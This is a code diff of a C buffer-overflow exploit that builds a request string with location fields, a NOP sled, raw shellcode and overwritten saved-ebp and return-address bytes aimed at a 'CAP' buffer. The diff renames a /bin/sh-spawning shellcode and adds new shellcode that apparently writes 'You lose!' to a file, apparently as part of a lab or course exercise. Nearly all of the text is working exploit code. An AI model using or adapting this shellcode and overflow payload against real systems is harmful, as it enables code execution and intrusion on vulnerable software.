@@ -25,7 +25,7 @@
 
 int main(int argc, char** argv)
 {
-	char shellcode[]=
+	char shellcode1[]=
 		"\xeb\x1f"                      /* jmp 0x1f              */
 		"\x5e"                          /* popl %esi             */
 		"\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
@@ -44,15 +44,38 @@ int main(int argc, char** argv)
 		"\xe8\xdc\xff\xff\xff"          /* call -0x24            */
 		"/bin/sh";                      /* .string \"/bin/sh\"   */
 
+char shellcode[] =
+	"\xeb\x39\x5e\x31"
+	"\xc0\x88\x46\x07"
+	"\x88\x46\x11\x8d"
+	"\x5e\x08\x89\x5e"
+	"\x12\xb0\x05\x8d"
+	"\x1e\x66\xb9\x42"
+	"\x04\x66\xba\xe4"
+	"\x01\xcd\x80\x89"
+	"\xc3\xb0\x04\x8b"
+	"\x4e\x12\x66\xba"
+	"\x0f\x27\x66\x81"
+	"\xea\x06\x27\xcd"
+	"\x80\xb0\x06\xcd"
+	"\x80\xb0\x01\x31"
+	"\xdb\xcd\x80\xe8"
+	"\xc2\xff\xff\xff"
+	"\x66\x6f\x6f\x2e"
+	"\x74\x78\x74\x23"
+	"\x59\x6f\x75\x20"
+	"\x6c\x6f\x73\x65"
+	"\x21\x23\x78\x78"
+	"\x78\x78";
 
 
 	int scLen = strlen(shellcode); //length of shellcode
 
 	char reqstring[1000] = "IMG:abcd.jpg;LAT:57.64911;LON:10.40744;";
 	
-	char attach[549 - scLen];
-	memset(attach, 0x00, 549 - scLen);
-	memset(attach, 0x90, 548 - scLen);
+	char attach[558 - scLen];
+	memset(attach, 0x00, 558 - scLen);
+	memset(attach, 0x90, 557 - scLen);
 	strcat(reqstring, attach);
 	
 	strcat(reqstring,shellcode);
@@ -63,7 +86,7 @@ int main(int argc, char** argv)
 	strcat(reqstring,extra);
 
 
-	strcat(reqstring, ";CAP:BBBBBBBBB");
+	strcat(reqstring, ";CAP:");
 	strcat(reqstring, "\xf0\x4f\x48\x55"); //ebp, 4 bytes
 	strcat(reqstring, "\x40\x4D\x48\x55"); //return address, 4 bytes, in the middle of the gt.cap buffer
 
